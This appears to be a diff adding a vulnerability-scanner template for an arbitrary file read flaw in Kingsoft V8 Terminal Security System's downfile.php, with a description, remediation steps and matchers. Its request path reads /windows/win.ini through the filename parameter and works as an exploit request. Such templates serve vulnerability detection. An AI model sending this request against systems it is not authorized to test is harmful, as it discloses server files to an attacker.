@@ -1,0 +1,41 @@
+id: kingsoft-v8-file-read
+info:
+  name: Kingsoft V8 File Read
+  author:
+  - l0ne1y
+  description: |-
+    Kingsoft V8 Terminal Security System downfile.php Arbitrary File Read Vulnerability
+    Kingsoft V8 Terminal Security System is a new-generation enterprise terminal security software that can dynamically detect, process in real time, and trace unknown threats across the entire network. It meets the increasingly complex terminal security protection needs of domestic enterprise users across diverse endpoints including PCs, mobile devices, and virtual desktops.
+
+    Kingsoft V8 Terminal Security System has an arbitrary file read vulnerability. Attackers can use it to download arbitrary files from the server.
+  severity: high
+  remediation: |-
+    Official remediation:
+    1. It is recommended that users obtain the latest patch or the latest version of the program from the vendor:
+    https://www.ejinshan.net/
+
+    Temporary remediation:
+    1. Filter "." so that users cannot navigate to parent directories from URLs.
+    2. Strictly validate the format of user input parameters with regular expressions, hardcode or uniformly encode the filename parameters passed by users, whitelist file types, and reject parameters containing malicious or empty characters.
+    3. Disable directory traversal services; for example, configure open_basedir in php.ini to restrict the file access scope.
+    4. Store file paths in the database and allow users to download files by submitting the corresponding file ID.
+    5. Verify user permissions before file downloads.
+requests:
+- matchers:
+  - type: word
+    condition: and
+    part: body
+    words:
+    - for 16-bit app support
+    - '[extensions]'
+  - type: word
+    part: header
+    words:
+    - application/zip
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/htmltopdf/downfile.php?filename=/windows/win.ini'
+  method: GET
